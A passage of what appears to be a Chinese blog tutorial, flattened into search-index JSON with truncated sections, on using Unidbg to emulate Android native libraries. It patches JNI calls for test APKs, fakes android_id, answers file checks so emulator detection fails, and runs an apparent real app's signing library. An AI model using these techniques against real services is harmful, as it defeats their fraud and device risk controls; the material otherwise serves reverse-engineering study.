LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(new File(\"unidbg-android/src/test/java/com/example/luodst/files/DogPro.apk\")); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator, vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(\"dogpro\", true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } private void getHash() { DvmObject\u003c?\u003e dvmObject = vm.resolveClass(\"com/example/dogpro/MainActivity\").newObject(null); String input = \"unidbg-android/src/test/java/com/example/luodst/files/dogpro.apk\"; DvmObject\u003c?\u003e ret = dvmObject.callJniMethodObject(emulator, \"getHash(Ljava/lang/String;)Ljava/lang/String;\", input); System.out.println(\"result ==\u003e \"+ret.getValue()); } } 运行上述代码,报错如下: java.lang.UnsupportedOperationException: java/util/zip/ZipFile-\u003e\u003cinit\u003e(Ljava/lang/String;)V at com.github.unidbg.linux.android.dvm.AbstractJni.newObjectV(AbstractJni.java:803) at com.github.unidbg.linux.android.dvm.AbstractJni.newObjectV(AbstractJni.java:758) at com.github.unidbg.linux.android.dvm.DvmMethod.newObjectV(DvmMethod.java:214) at com.github.unidbg.linux.android.dvm.DalvikVM$26.handle(DalvikVM.java:415) 这是一个构造方法,传入的参数类型为String,可以用下述代码去进行对象构造. public DvmObject\u003c?\u003e newObjectV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) { switch (signature) { case \"java/util/zip/ZipFile-\u003e\u003cinit\u003e(Ljava/lang/String;)V\":{ String name = (String) vaList.getObjectArg(0).getValue(); try { ZipFile zipFile = new ZipFile(name); return vm.resolveClass(\"java/util/zip/ZipFile\").newObject(zipFile); } catch (IOException e) { throw new RuntimeException(e); } } } return super.newObjectV(vm, dvmClass, signature, vaList); } 继续运行代码,报错如下: java.lang.UnsupportedOperationException: java/util/zip/ZipFile-\u003eentries()Ljava/util/Enumeration; at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417) at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262) at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodV(DvmMethod.java:89) at com.github.unidbg.linux.android.dvm.DalvikVM$32.handle(DalvikVM.java:553) 上述代码提示,缺少了ZipFile的entries方法,修补代码如下: public DvmObject\u003c?\u003e callObjectMethodV(BaseVM vm, DvmObject\u003c?\u003e dvmObject, String signature, VaList vaList) { switch (signature) { case \"java/util/zip/ZipFile-\u003eentries()Ljava/util/Enumeration;\": { //拿操作的对象 ZipFile zipFile = (ZipFile) dvmObject.getValue(); //通过对象来调用方法 Enumeration\u003c? extends ZipEntry\u003e entries = zipFile.entries(); return vm.resolveClass(\"java/util/Enumeration\").newObject(entries); } } return super.callObjectMethodV(vm, dvmObject, signature, vaList); } 继续运行代码,报错如下: java.lang.ClassCastException: class com.github.unidbg.linux.android.dvm.DvmObject cannot be cast to class com.github.unidbg.linux.android.dvm.Enumeration (com.git","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:1:2","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"JNI_OnLoad ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:2:0","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"测试Apk BossLast.apk ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:2:1","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"模拟执行 使用Unidbg模拟调用so中的JNI_OnLoad函数,初始化代码如下: package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.backend.Unicorn2Factory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.memory.Memory; import com.github.unidbg.virtualmodule.android.AndroidModule; import java.io.File; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); } private final AndroidEmulator emulator; private final VM vm; private final Module module; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for32Bit() .addBackendFactory(new Unicorn2Factory(true)) .setRootDir(new File(\"unidbg-android/src/test/java/com/example/luodst/rootfs\")) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(new File(\"unidbg-android/src/test/java/com/example/luodst/files/boss_last.apk\")); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator, vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(\"yzwg\", true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } } 运行上述代码,报错如下: [main]D/YZWG: JNI_OnLoad called Exception in thread \"main\" java.lang.IllegalStateException: Illegal JNI version: 0xffffffff at com.github.unidbg.linux.android.dvm.BaseVM.checkVersion(BaseVM.java:228) at com.github.unidbg.linux.android.dvm.DalvikModule.callJNI_OnLoad(DalvikModule.java:39) at com.example.luodst.MainActivity.\u003cinit\u003e(MainActivity.java:49) at com.example.luodst.MainActivity.main(MainActivity.java:17) [14:37:26 484] WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:540) - handleInterrupt intno=2, NR=0, svcNumber=0x18d, PC=unidbg@0xfffe0964, LR=RX@0x4000a87b[libyzwg.so]0xa87b, syscall=null java.lang.UnsupportedOperationException: com/twl/signer/YZWG-\u003egContext:Landroid/content/Context; at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:103) at com.github.unidbg.linux.android.dvm.AbstractJni.getStaticObjectField(AbstractJni.java:53) at com.github.unidbg.linux.android.dvm.DvmField.getStaticObjectField(DvmField.java:106) at com.github.unidbg.linux.android.dvm.DalvikVM$142.handle(DalvikVM.java:2276) 报错内容中有Illegal JNI version,是因为JNi_OnLoad调用失败,没有返回JNI版本信息.故Unidbg报非法的JNI版本. 报错内容中还包含Context,Context是维持Android程序中各个组件正常工作的核心功能类. Unidbg运行在Java环境下,Context是Android中的类,我们不能像MessageDigest(Java SDK提供的工具类)那样去补这类环境,但是我们可以遵循一个补环境的准测:新建一个这种类,将类的对象置空. 与此同时,我们需要知道这里的报错是在做什么事情,以及它所构造参数的数据类型是什么,以便下次再遇到时,能给对象一个合理的值. 这里补的Context代码如下: public DvmObject\u003c?\u003e getStaticObjectField(BaseVM vm, DvmClass dvmClass, String signature) { switch (signature) { case \"com/twl/signer/YZWG-\u003egContext:Landroid/content/Context;\":{ return vm.resolveClass(\"android/content/Context\").newObject(null); } } return super.getStaticObjectField(vm, dvmClass, signature); } 我们将setVerbose的参数置为true,运行代码,来看下JNI的执行流. //查找类 JNIEnv-\u003eFindClass(com/twl/signer/YZWG) was called from RX@0x4000a561[libyzwg.so]0xa561 //获取类中的Context字段 JNIEnv-\u003eGetStaticFieldID(com/twl/signer/YZWG.gContextLandroid/content/Context;) =\u003e 0x200e062f was called from RX@0x4000a577[libyzwg.so]0xa577 //获取类中的Context对象 JNIEnv-\u003eGetStaticObjectField(class com/twl/signer/YZWG, gContext Landroid/content/Context; =\u003e android.content.Context@14ec4505) was called from RX@0x4000a87b[libyzwg.so]0xa87b //获取Context中的getPackageManager方法ID JNIEnv-\u003eGetMethodID(android/content/Context.getPackageManager()Landroid/content/pm/PackageManager;) =\u003e 0x3acc78f0 was called from RX@0x40027d63[libyzwg.so]0x27d63 //调用getPackageManager方法 JNIEnv-\u003eCallObjectMethod(android.c","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:2:2","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"文件标识 ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:3:0","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"测试Apk DogLite.apk ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:3:1","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"detectFile 使用Unidbg模拟执行so中的detectFile函数,初始化代码如下: package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.backend.Unicorn2Factory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.memory.Memory; import com.github.unidbg.virtualmodule.android.AndroidModule; import java.io.File; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); mainActivity.detectFile(); } private final AndroidEmulator emulator; private final VM vm; private final Module module; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for32Bit() .addBackendFactory(new Unicorn2Factory(true)) .setRootDir(new File(\"unidbg-android/src/test/java/com/example/luodst/rootfs\")) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(new File(\"unidbg-android/src/test/java/com/example/luodst/files/DogLite.apk\")); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator, vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(\"doglite\", true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } private void detectFile() { DvmObject obj = vm.resolveClass(\"com/example/doglite/MainActivity\").newObject(null); obj.callJniMethod(emulator, \"detectFile()V\"); } } 运行上述代码,报错如下: java.lang.UnsupportedOperationException: java/io/File-\u003e\u003cinit\u003e(Ljava/lang/String;)V at com.github.unidbg.linux.android.dvm.AbstractJni.newObjectV(AbstractJni.java:803) at com.github.unidbg.linux.android.dvm.AbstractJni.newObjectV(AbstractJni.java:758) at com.github.unidbg.linux.android.dvm.DvmMethod.newObjectV(DvmMethod.java:214) at com.github.unidbg.linux.android.dvm.DalvikVM$26.handle(DalvikVM.java:415) 按惯例,补代码如下: public DvmObject\u003c?\u003e newObjectV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) { switch (signature) { case \"java/io/File-\u003e\u003cinit\u003e(Ljava/lang/String;)V\":{ String path = (String) vaList.getObjectArg(0).getValue(); //System.out.println(\"path: \" +path); File file = new File(path); return vm.resolveClass(\"java/io/File\").newObject(file); } } return super.newObjectV(vm, dvmClass, signature, vaList); } 继续运行代码,报错如下: java.lang.UnsupportedOperationException: java/io/File-\u003eexists()Z at com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:625) at com.github.unidbg.linux.android.dvm.AbstractJni.callBooleanMethodV(AbstractJni.java:603) at com.github.unidbg.linux.android.dvm.DvmMethod.callBooleanMethodV(DvmMethod.java:119) at com.github.unidbg.linux.android.dvm.DalvikVM$35.handle(DalvikVM.java:630) 按惯例,补代码如下: 从上述路径来看,主要是检测电池的电量和模拟器.按照一般逻辑,电池的电量需要被检测,模拟器不能被检测.故我们需要根据不同文件标识做不同的处理,修正代码如下: public boolean callBooleanMethodV(BaseVM vm, DvmObject\u003c?\u003e dvmObject, String signature , VaList vaList) { switch (signature) { case \"java/io/File-\u003eexists()Z\":{ File file = (File) dvmObject.getValue(); String path = file.getPath(); /* System.out.println(\"path: \" +path); return file.exists();*/ switch (path){ case \"\\\\sys\\\\class\\\\power_supply\\\\battery\\\\voltage_now\": return true; case \"\\\\data\\\\local\\\\tmp\\\\Nox\": return false; } } } return super.callBooleanMethodV(vm, dvmObject, signature, vaList); } ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:3:2","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"detectFileNew 使用Unidbg模拟执行so中的detectFileNew函数,初始化代码如下: package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.backend.Unicorn2Factory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.memory.Memory; import com.github.unidbg.virtualmodule.android.AndroidModule; import java.io.File; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); mainActivity.detectFileNew(); } private final AndroidEmulator emulator; private final VM vm; private final Module module; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for32Bit() .addBackendFactory(new Unicorn2Factory(true)) .setRootDir(new File(\"unidbg-android/src/test/java/com/example/luodst/rootfs\")) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(new File(\"unidbg-android/src/test/java/com/example/luodst/files/DogLite.apk\")); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator, vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(\"doglite\", true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } private void detectFileNew() { DvmObject obj = vm.resolveClass(\"com/example/doglite/MainActivity\").newObject(null); obj.callJniMethod(emulator, \"detectFileNew()V\"); } } 运行上述代码,报错如下: java.lang.UnsupportedOperationException: java/io/File-\u003eallocObject at com.github.unidbg.linux.android.dvm.AbstractJni.allocObject(AbstractJni.java:812) at com.github.unidbg.linux.android.dvm.DvmClass.allocObject(DvmClass.java:74) at com.github.unidbg.linux.android.dvm.DalvikVM$24.handle(DalvikVM.java:366) at com.github.unidbg.linux.ARM32SyscallHandler.hook(ARM32SyscallHandler.java:133) 从上述报错来看是调用了allocObject函数,这里把newObject拿来做对比,两者的共同点都是用于构建新的类对象.两者区别如下: allocObject:只构建新的类对象(仅仅为类对象分配内存空间),既不初始化成员变量,也不调用构造方法. newObject:需要指明调用的构造方法,构建新的类对象,并初始化成员变量,调用指定的构造方法. 也就是说我们新模拟执行的这个方法再一次调用了File类,只不过初始化操作需要我们自己来做.补代码如下: public DvmObject\u003c?\u003e allocObject(BaseVM vm, DvmClass dvmClass, String signature) { switch (signature) { case \"java/io/File-\u003eallocObject\": { return vm.resolveClass(\"java/io/File\").newObject(null); } } return super.allocObject(vm, dvmClass, signature); } 运行上述代码,报错如下: java.lang.UnsupportedOperationException: java/io/File-\u003e\u003cinit\u003e(Ljava/lang/String;)V at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:1007) at com.github.unidbg.linux.android.dvm.AbstractJni.callVoidMethodV(AbstractJni.java:990) at com.github.unidbg.linux.android.dvm.DvmMethod.callVoidMethodV(DvmMethod.java:229) at com.github.unidbg.linux.android.dvm.DalvikVM$59.handle(DalvikVM.java:1051) 再一次调用了init方法,既然在allocObject中创建了对象,那么我们可以通过一些技术手段来区分这些对象的创建.allocObject的修正代码如下: private static int nCount = 0; private int getnCount() { return ++nCount; } public DvmObject\u003c?\u003e allocObject(BaseVM vm, DvmClass dvmClass, String signature) { switch (signature) { case \"java/io/File-\u003eallocObject\": { return vm.resolveClass(\"java/io/File\").newObject(getnCount()); } } return super.allocObject(vm, dvmClass, signature); } 上述我们使用了一个int类型的数值来标识不同的对象.接下来,补File的构造函数: public void callVoidMethodV(BaseVM vm, DvmObject\u003c?\u003e dvmObject, String signature, VaList vaList) { switch (signature) { case \"java/io/File-\u003e\u003cinit\u003e(Ljava/lang/String;)V\": { String key = dvmObject.getValue().toString(); String path = (String) vaList.getObjectArg(0).getValue(); emulator.set(key, path); return; } } super.callVoidMethodV(vm, dvmObject, signature, vaList); } 上述我们在模拟器上给它绑定了对象和要传入的参数. 继续运行代码,报错如下: java.lang.UnsupportedOperationException: java/io/File-\u003eexists()Z at ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:3:3","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"设备风控 ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:4:0","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"测试Apk DogLite.apk ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:4:1","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"SysInfo 使用Unidbg模拟执行so中的SysInfo函数,初始化代码如下: package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.backend.Unicorn2Factory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.memory.Memory; import com.github.unidbg.virtualmodule.android.AndroidModule; import java.io.File; import java.util.Base64; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); mainActivity.SysInfo(); } private final AndroidEmulator emulator; private final VM vm; private final Module module; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for32Bit() .addBackendFactory(new Unicorn2Factory(true)) .setRootDir(new File(\"unidbg-android/src/test/java/com/example/luodst/rootfs\")) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(new File(\"unidbg-android/src/test/java/com/example/luodst/files/DogLite.apk\")); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator, vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(\"doglite\", true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } private void SysInfo() { DvmObject obj = vm.resolveClass(\"com/example/doglite/MainActivity\").newObject(null); obj.callJniMethod(emulator, \"SysInfo()V\"); } } 运行上述代码,报错如下: java.lang.UnsupportedOperationException: android/app/ActivityThread-\u003egetApplication()Landroid/app/Application; at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417) at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262) at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodV(DvmMethod.java:89) at com.github.unidbg.linux.android.dvm.DalvikVM$32.handle(DalvikVM.java:553) 对于Android中的类,可以先置空.故补代码如下: public DvmObject\u003c?\u003e callObjectMethodV(BaseVM vm, DvmObject\u003c?\u003e dvmObject, String signature, VaList vaList) { switch (signature) { case \"android/app/ActivityThread-\u003egetApplication()Landroid/app/Application;\":{ return vm.resolveClass(\"android/app/Application\").newObject(null); } } return super.callObjectMethodV(vm, dvmObject, signature, vaList); } 继续运行代码,报错如下: 从上述代码可以看到是在获取android_id,我们可以根据返回值类型构造一个合理的数值.故补代码如下: public DvmObject\u003c?\u003e callStaticObjectMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) { switch (signature) { case \"android/provider/Settings$Secure-\u003egetString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;\":{ return new StringObject(vm, \"Xia Luo Hun !\"); } } return super.callStaticObjectMethodV(vm, dvmClass, signature, vaList); } 再次运行代码,成功输出如下: [main]E/引导: android id:Xia Luo Hun ! ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:4:2","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"getAppFilesDir 使用Unidbg模拟执行so中的getAppFilesDir函数,初始化代码如下: package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.backend.Unicorn2Factory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.memory.Memory; import com.github.unidbg.virtualmodule.android.AndroidModule; import java.io.File; import java.util.Base64; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); mainActivity.getAppFilesDir(); } private final AndroidEmulator emulator; private final VM vm; private final Module module; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for32Bit() .addBackendFactory(new Unicorn2Factory(true)) .setRootDir(new File(\"unidbg-android/src/test/java/com/example/luodst/rootfs\")) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(new File(\"unidbg-android/src/test/java/com/example/luodst/files/DogLite.apk\")); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator, vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(\"doglite\", true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } private void getAppFilesDir() { DvmObject obj = vm.resolveClass(\"com/example/doglite/MainActivity\").newObject(null); obj.callJniMethod(emulator, \"getAppFilesDir()V\"); } } 运行上述代码,报错如下: java.lang.UnsupportedOperationException: android/os/Environment-\u003egetExternalStorageDirectory()Ljava/io/File; at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:504) at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:438) at com.github.unidbg.linux.android.dvm.DvmMethod.callStaticObjectMethodV(DvmMethod.java:59) at com.github.unidbg.linux.android.dvm.DalvikVM$113.handle(DalvikVM.java:1816) 按惯例,补代码如下: public DvmObject\u003c?\u003e callStaticObjectMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) { switch (signature) { case \"android/os/Environment-\u003egetExternalStorageDirectory()Ljava/io/File;\":{ return vm.resolveClass(\"java/io/File\").newObject(null); } } return super.callStaticObjectMethodV(vm, dvmClass, signature, vaList); } 继续运行代码,报错如下: java.lang.NullPointerException: Cannot invoke \"java.io.File.getAbsolutePath()\" because \"file\" is null at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:307) at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:262) at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethodV(DvmMethod.java:89) at com.github.unidbg.linux.android.dvm.DalvikVM$32.handle(DalvikVM.java:553) 这是因为上一步中给的File类创建的对象为空,故不能通过File实例对象来调用getAbsolutePath方法.我们需要重写的内容如下: public DvmObject\u003c?\u003e callObjectMethodV(BaseVM vm, DvmObject\u003c?\u003e dvmObject, String signature, VaList vaList) { switch (signature) { case \"java/io/File-\u003egetAbsolutePath()Ljava/lang/String;\":{ } } return super.callObjectMethodV(vm, dvmObject, signature, vaList); } 这里调用getAbsolutePath方法,我们依旧使用标识的方式来确定当前使用的是哪个对象.最终代码如下: public DvmObject\u003c?\u003e callStaticObjectMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) { switch (signature) { case \"android/os/Environment-\u003egetExternalStorageDirectory()Ljava/io/File;\":{ return vm.resolveClass(\"java/io/File\").newObject(signature); } } return super.callStaticObjectMethodV(vm, dvmClass, signature, vaList); } public DvmObject\u003c?\u003e callObjectMethodV(BaseVM vm, DvmObject\u003c?\u003e dvmObject, String signature, VaList vaList) { switch (signature) { case \"java/io/File-\u003egetAbsolutePath()Ljava/lang/String;\":{ Strin","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:4:3","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"补环境加强 下面以一个无障碍服务为切入点,介绍如何补这种类型的Android系统函数.同时,也强调了补环境的一个基本准测:先将流程跑通,再处理值的问题. ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:5:0","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"测试Apk DogPlus.apk ","date":"2024-07-10","objectID":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/:5:1","tags":["Unidbg"],"title":"Unidbg补环境实战","uri":"/posts/android/unidbg/04unidbg%E8%A1%A5%E7%8E%AF%E5%A2%83%E5%AE%9E%E6%88%98/"},{"categories":["Unidbg"],"content":"模拟执行 使用Unidbg模拟执行so中的detectAccessibilityManager函数,初始化代码如下: package com.example.luodst; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.Module; import com.github.unidbg.arm.backend.Unicorn2Factory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.*; import com.github.unidbg.memory.Memory; import com.github.unidbg.virtualmodule.android.AndroidModule; import java.io.File; public class MainActivity extends AbstractJni { public static void main(String[] args) { MainActivity mainActivity = new MainActivity(); mainActivity.detectAccessibilityManager(); } private final AndroidEmulator emulator; private final VM vm; private final Module module; private MainActivity() { //1.创建Android模拟器实例 emulator = AndroidEmulatorBuilder .for32Bit() .addBackendFactory(new Unicorn2Factory(true)) .setRootDir(new File(\"unidbg-android/src/test/java/com/example/luodst/rootfs\")) .build(); //2.获取操作内存的接口 Memory memory = emulator.getMemory(); //3.设置Android SDK 版本 LibraryResolver resolver = new AndroidResolver(23); memory.setLibraryResolver(resolver); //4.创建虚拟机 vm = emulator.createDalvikVM(new File(\"unidbg-android/src/test/java/com/example/luodst/files/DogPlus.apk\")); //5.是否打印日志 vm.setVerbose(false); //6.设置jni vm.setJni(this); new AndroidModule(emulator, vm).register(memory); //7.加载目标so文件 DalvikModule dm = vm.loadLibrary(\"dogplus\", true); //8.将so文件对应的Module存入成员变量 module = dm.getModule(); //9.调用JNI_OnLoad dm.callJNI_OnLoad(emulator); } private void detectAccessibilityManager() { DvmObject obj = vm.resolveClass(\"com/example/dogplus/MainActivity\").newObject(null); obj.callJniMethod(emulator, \"detectAccessibilityManager()V\"); } } 运行上述代码,报错如下: java.lang.UnsupportedOperationException: android/app/ActivityThread-\u003egetApplication()Landroid/app/Application; at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethodV(AbstractJni.java:417) at 